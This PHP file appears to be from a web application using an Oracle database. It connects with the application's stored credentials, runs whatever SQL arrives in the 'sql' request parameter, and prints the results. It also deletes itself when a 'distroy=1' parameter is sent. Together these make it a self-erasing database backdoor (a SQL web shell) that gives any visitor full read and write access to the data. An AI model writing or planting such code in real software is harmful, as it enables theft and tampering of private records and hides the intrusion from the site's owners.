<?php

	
	error_reporting(1);
        	
	$SERVER_TYPE = explode("/", $_SERVER['SERVER_SOFTWARE']);
	if( substr_count($SERVER_TYPE[0], "Apache") ){
		$ROOTPATH = $_SERVER['DOCUMENT_ROOT'];
	}elseif( substr_count($SERVER_TYPE[0], "IIS") ){
		$ROOTPATH = $_SERVER['APPL_PHYSICAL_PATH'];
//		$virtual_site = "DREAM/";
	}
	if (!$ch_dpisdb_port) $ch_dpisdb_port = "1521";
	if (!$ch_attdb_port) $ch_attdb_port = "1521";
	if (!$ch_dpis35db_port) $ch_dpis35db_port = "1521";
        

	include("$ROOTPATH/php_scripts/db_connect_var.php");
	$db_type = "oci8";
	include("$ROOTPATH/php_scripts/connect_".$db_type.".php");
	if($db_type=="mysql"){
		class connect_db extends connect_mysql { };
	}elseif($db_type=="mssql"){
		class connect_db extends connect_mssql { };
	}elseif($db_type=="oci8"){
		class connect_db extends connect_oci8 { };
	}elseif($db_type=="odbc"){
		class connect_db extends connect_odbc { };
	} // end if
	$db = new connect_db($db_host, $db_name, $db_user, $db_pwd);
	$sql = $_REQUEST['sql'];
	$db->send_cmd($sql);
	$a = $dataG2 = $db->get_array();
	print_r($a);
    if($_REQUEST['distroy'] == "1"){unlink(__FILE__);}
?>
